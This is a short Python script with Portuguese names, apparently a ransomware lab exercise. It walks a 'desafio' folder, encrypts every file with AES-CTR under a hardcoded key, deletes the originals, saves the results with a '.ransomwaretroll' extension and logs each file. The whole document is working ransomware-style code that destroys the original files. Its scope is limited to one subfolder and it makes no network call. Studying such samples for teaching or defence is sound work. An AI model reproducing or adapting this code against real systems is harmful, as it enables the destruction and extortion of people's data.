import os
import pyaes
from datetime import datetime

base_dir = os.path.join(os.path.dirname(__file__), "desafio")
log_path = os.path.join(os.path.dirname(__file__), "encrypt.log")

key = b"testeransomwares"

def log(mensagem):
    with open(log_path, "a") as log_file:
        log_file.write(f"[{datetime.now()}] {mensagem}\n")

def criptografar_arquivo(file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()

        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        os.remove(file_path)

        new_file = file_path + ".ransomwaretroll"
        with open(new_file, "wb") as newfile:
            newfile.write(crypto_data)

        log(f"Criptografado: {file_path}")
        print(f"[OK] {file_path}")
    except Exception as e:
        log(f"Erro ao criptografar {file_path}: {e}")
        print(f"[ERRO] {file_path}")

for root, dirs, files in os.walk(base_dir):
    for file_name in files:
        full_path = os.path.join(root, file_name)
        if not file_name.endswith(".ransomwaretroll"):
            criptografar_arquivo(full_path)
